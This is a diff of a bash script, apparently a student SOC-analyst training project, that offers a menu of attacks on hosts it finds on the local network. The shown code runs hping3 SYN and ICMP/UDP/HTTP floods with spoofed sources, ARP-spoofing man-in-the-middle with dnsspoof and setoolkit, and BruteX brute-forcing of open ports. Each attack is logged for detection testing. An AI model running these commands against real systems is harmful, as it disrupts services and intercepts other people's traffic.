@@ -1,10 +1,5 @@
 #!/bin/bash
 
-# Student name: Efi Kozinski
-# Student Code: <S3>
-# Class: TMAGEN77369
-# Lecturer: Simon Bar
-
 #Installations function is used to install the relevant command and programs.
 #note: not all programs are installed in this function. BruteX is installed in the relevant function only.
 installations () {
@@ -18,28 +13,26 @@ installations () {
 	sudo apt-get install -y hping3 &>/dev/null
 }
 
-#Banner function has 2 uses: 1) displaying the tools and attack names and options. 2) declare the installation function.
+#Banner function has 2 uses: 1) displaying the tools and attack types. 2) declare the installation function.
 ban() {
 	figlet "SOC ANALYST"
 	
-	echo "~~Created by Efi Kozinski"
+	echo "~~Created by Efi K"
 	echo ""
-	echo "~~This tool will help to run and test 3 types of attack:"
+	echo "~~This script will help to run and test 3 types of attack:"
 	sleep 1
-	echo "~~1. Brute-Force Attack on an open port (a selected 1 or all of them)"
-	echo "~~the Brute-Force attack uses BruteX git."
-	echo "~~Using default wordlists"
+	echo "~~1. Brute-Force Attack "
+	echo "~~The Brute-Force attack uses BruteX git on open ports while using default wordlists"
 	echo ""
 	sleep 1
-	echo "~~2. MitM attack - man in the middle"
+	echo "~~2. MitM attack - Man in The Middle"
 	echo "~~Using arpspoof tool as a base for the attacks and then choosing which attack to execute: "
-	echo "  (Cache poisoning with) dnsspoof into setoolkit,(sniff with) tshark,(image retriever) driftnet tools, "
-	echo "   pick one in random or ALL of them at once "
+	echo "  Sniff with tshark, Retrieve images with driftnet tools or Cache poisoning with dnsspoof and Exploit with setoolkit "
 	echo ""
 	sleep 1
-	echo "~~3. DoS Attack - Denial of Service"
-	echo "~~TCP SYN Flood Attack - using hping3 tool to send the SYN requests. ##WARNING!!!! MAY CAUSE TROUBLE RUNNING OTHER APPS##"
-	echo "~~UDP/ICMP/HTTP Flood Attack - sending a vast amount of packets to the victim using hping3 tool. ##WARNING!!!! MAY CAUSE TROUBLE RUNNING OTHER APPS##"
+	echo "~~3. DOS Attack - Denial of Service"
+	echo "~~TCP SYN Flood Attack - Using hping3 tool to send the SYN requests. ##WARNING!!!! MAY CAUSE TROUBLE RUNNING OTHER APPS##"
+	echo "~~UDP/ICMP/HTTP Flood Attack - Sending a vast amount of packets to the victim using hping3 tool. ##WARNING!!!! MAY CAUSE TROUBLE RUNNING OTHER APPS##"
 	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	sleep 3
 	echo "## Updating and Installing Relevant tools ##"
@@ -68,7 +61,7 @@ DATACOLLECTION () {
 	#creating an array for the ips detected
 	arr=(`echo ${ip_array}`)
 	
-	#Displaying all located IPs menu with the array
+	#Displaying all detacted IPs 
 	echo "# Detected IPs on your network : "
 	
 	for i in ${!arr[@]}; do
@@ -106,8 +99,8 @@ menu () {
 	echo "# SOC Checker Attacks :"
 	echo "~1~ MitM "
 	echo "~2~ Bruteforce "
-	echo "~3~ DoS Attack"
-	echo "~4~ Random Attack [ From the 3 above ]"
+	echo "~3~ DoS Attack "
+	echo "~4~ Random Attack [from the 3 above] "
 	
 	read -p "# Choose the attack you wish to start : " ch
 	
@@ -268,12 +261,13 @@ MITM () {
 			esac
 		
 		}
-	
+		#Declaring the mitm function
 		mitm_menu
 	
 	}
 
 	step_3
+	#Enabling forwarding of packets (making this mechine transfer packets from the router ot the victim and back to the router)
 	sudo echo 0 > /proc/sys/net/ipv4/ip_forward
 }
 
@@ -310,7 +304,6 @@ BRUTEFORCE () {
 			
 		#Display the open port menu
 		for f in ${!sbp_arr[@]}; do
-			
 			echo "~$f~ ${sbp_arr[$f]}"
 		done
 		
@@ -348,11 +341,10 @@ dos_attack () {
 	echo "$(date)   $cur_ip --> $IP - DOS Attack was executed" >> /var/log/SOC.log
 	cd SOC_Analyst
 	
-	echo "## DOS_Attack ##"
-	echo "## TCP SYN Attack - Flooding the victim with TCP SYN packets (1st step of the 3-way hand shake) which the victim has to answer."
-	echo "##                  this is making hard for the machine to receive and reply to legit SYN packets." 
-	echo "##                    "
-	echo "## Flood DoS Attack - Flooding the victim traffic by sending vast amount of packets "
+	echo "## DOS Attack ##"
+	echo "## TCP SYN Attack - Flooding the victim with TCP SYN packets (1st step out of the 3-way hand shake) which the victim has to answer."
+	echo "##                  This is making hard for the machine to receive and reply to legit SYN packets." 
+	echo "## Flood DOS Attack - Flooding the victim traffic by sending vast amount of packets "
 	echo "##                    ICMP (ping) Flood, UDP Flood and HTTP Flood"
 	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	
@@ -361,46 +353,43 @@ dos_attack () {
 
 	sp_arr=(`echo ${p_array}`)
 
-
+	
 	syn_port_menu () {
 
 		echo "# Open ports detected by Nmap :"
-		#displaying the port with the array
+		
+		#Displaying the port with the array
         	for i in ${!sp_arr[@]}; do
-
         	        echo "~$i~ ${sp_arr[$i]}"
         	done
         	read -p "# Choose the open port you wish to attack : " po
 
         	#Saving the action in var/log/SOC.log
-        	echo "$(date)   $cur_ip --> $IP -- TCP SYN DoS Attack on port:${sp_arr[$po]}" >> /var/log/SOC.log
+        	echo "$(date)   $cur_ip --> $IP -- TCP_SYN_DOS Attack on port:${sp_arr[$po]}" >> /var/log/SOC.log
 
         	
-        	#Executing hping3 on the victim IP
-        	echo "# Executing attack $IP, on port ${sp_arr[$po]}"
+        	#Executing hping3 
+        	echo "# Executing DOS attack on $IP address, on port ${sp_arr[$po]}..."
         	sleep 2
 		sudo hping3 -d 120 -S -w 64 -p ${sp_arr[$po]} --flood --rand-source $IP
 	}
 
 	
 	type_hp3 (){
-		#the menu to choose the type of packets to send
+		#Displaying the menu to choose the type of packets to send
 		echo "# Choose the type of flood you wish to execute"	
 		echo "~1~ ICMP Flood"
 		echo "~2~ UDP Flood"
 		echo "~3~ HTTP Flood"
 		read -p "# Your choice:" pkt
 		echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-		echo "$(date)   $cur_ip --> $IP -- Flood DoS Attack" >> /var/log/SOC.log
+		echo "$(date)   $cur_ip --> $IP -- Flood DOS Attack" >> /var/log/SOC.log
 		
 		#Executing hping3 on the victim with the selected type
 		case $pkt in
-			1) echo "$(date)   $cur_ip --> $IP -- **ICMP Flood DoS Attack " >> /var/log/SOC.log && sudo hping3 --flood --rand-source --icmp $IP
-			;;
-			2) echo "$(date)   $cur_ip --> $IP -- **UDP Flood DoS Attack "  >> /var/log/SOC.log && sudo hping3 --flood --rand-source --udp $IP
-			;;
-			3) echo "$(date)   $cur_ip --> $IP -- **HTTP Flood DoS Attack" >> /var/log/SOC.log && sudo hping3 --flood --rand-source -p 80 $IP
-			;;
+			1) echo "$(date)   $cur_ip --> $IP -- **ICMP Flood DOS Attack " >> /var/log/SOC.log && sudo hping3 --flood --rand-source --icmp $IP ;;
+			2) echo "$(date)   $cur_ip --> $IP -- **UDP Flood DOS Attack "  >> /var/log/SOC.log && sudo hping3 --flood --rand-source --udp $IP ;;
+			3) echo "$(date)   $cur_ip --> $IP -- **HTTP Flood DOS Attack" >> /var/log/SOC.log && sudo hping3 --flood --rand-source -p 80 $IP ;;
 			*) echo "Invalid Input" exit 1 ;;
 	
 		esac
@@ -408,31 +397,28 @@ dos_attack () {
 	
 	#Displaying the DoS attack type  Menu to the user
 	echo "# What type of DOS attack you wish to execute?"
-	echo "~1~ TCP SYN DoS Attack"
-	echo "~2~ Flood DoS Attak"
+	echo "~1~ TCP SYN DOS Attack"
+	echo "~2~ Flood DOS Attack"
 	
-	#reading the attack type from the user and declaring the attack function by the user choice
+	#Reading the attack type from the user 
 	read -p "# Choose your attack : " dos_p
 	echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 	
+	#Declaring the attack function by the user's choice
 	case $dos_p in
-	
-		1) syn_port_menu
-		;;
-		2) type_hp3
-		;;
-		*) echo "Invalid Input" exit
-		;;
+		1) syn_port_menu;;
+		2) type_hp3;;
+		*) echo "Invalid Input" exit;;
 	esac
 	
 }
 
-#this is the main function which calls the "menu" and "ban" functions
+#This is the main function which calls the "menu" and "ban" functions and makes the folder for all the necessary files for the script
 main () {
 	ban
 	mkdir SOC_Analyst
 	menu
 }
 
-#declaring the main function
+#Declaring the main function
 main
